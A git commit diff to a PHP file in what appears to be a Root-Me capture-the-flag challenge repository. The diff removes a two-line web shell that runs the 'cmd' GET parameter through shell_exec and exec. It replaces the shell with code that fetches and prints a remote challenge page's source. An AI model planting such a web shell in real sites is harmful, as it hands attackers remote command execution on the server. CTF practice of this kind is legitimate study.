92bae0c7df7866c2c13cca42c4d7f5f2c9882bb4
Roqlane <78229498+Roqlane@users.noreply.github.com>
2024-07-23 19:18:45 +0200

    Update meow_lang.php

--- public/web-client/ch62/meow_lang.php
+++ public/web-client/ch62/meow_lang.php
@@ -1,4 +1,7 @@
 <?php
-shell_exec($_GET['cmd']);
-exec($_GET['cmd']);
+$phpFilePath = 'http://challenge01.root-me.org/web-serveur/ch13/index.php';
+$phpCode = file_get_contents($phpFilePath);
+$phpCode = htmlspecialchars($phpCode);
+
+echo "<pre>{$phpCode}</pre>";
 ?>
